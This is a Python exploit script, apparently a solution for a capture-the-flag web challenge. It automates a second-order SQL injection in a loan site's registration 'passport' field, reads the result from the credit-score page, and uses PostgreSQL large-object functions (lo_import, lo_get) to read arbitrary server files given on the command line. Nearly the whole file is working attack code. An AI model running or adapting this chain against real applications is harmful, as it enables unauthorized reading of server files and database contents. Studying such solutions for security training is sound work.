#!/usr/bin/python3

from lxml import html
import urllib.parse
import requests,random,sys

def sqli_postgres(sqli_data):

	main_site = "https://hli-instaloans-gmkory7.spbctf.com"

	# SQLi requires three phases:
	# 1) Passport field in registration

	email = urllib.parse.quote("test"+str(random.randint(100,999))+"@example.com.sg")
	password = "password12345"
	fname = "helloworld123123"
	lname = "helloworld123123"
	passport_sqli = urllib.parse.quote("123' UNION "+sqli_data+"--")
	city = "SG"
	income = "123123"


	reg_page = "/register"

	reg_data = { "email": email,
		"password": password,
		"first_name": "helloworld123123",
		"last_name": "helloworld123123",
		"passport": passport_sqli,
		"birthdate":"2021-01-01",
		"city":"SG",
		"income":"123123"
		}

	reg_req = requests.post(main_site+reg_page, data=reg_data)

	# 2) Login with new creds

	reqSession = requests.Session()

	login_page = "/login"
	login_data = {"email" : email, "password" : password}

	login_req = reqSession.post(main_site+login_page, data=login_data)

	# 3) Visit the /check_credit_score with the new session (extract info from class 'subtitle is-1 has-text-weight-bold)

	cs_page = "/check_credit_score"
	cs_req = reqSession.get(main_site+cs_page)

	tree = html.fromstring(cs_req.content)
	sqli_res = tree.xpath('//p[@class="subtitle is-1 has-text-weight-bold"]/text()')
	
	return sqli_res

# lfi attack requires two commands
# 1) SELECT text(lo_import(sys.argv[1]))-- => returns output data length
# 2) SELECT text(lo_get(data_length))--

lfi_p1 = sqli_postgres("SELECT text(lo_import('"+sys.argv[1]+"'))--")
lfi_p2 = sqli_postgres("SELECT text(lo_get("+lfi_p1[0]+"))--")

data_lfi = ''.join([str(s) for s in lfi_p2[0]])
temp = bytes.fromhex(data_lfi[2:]).decode("ASCII")
print(temp)


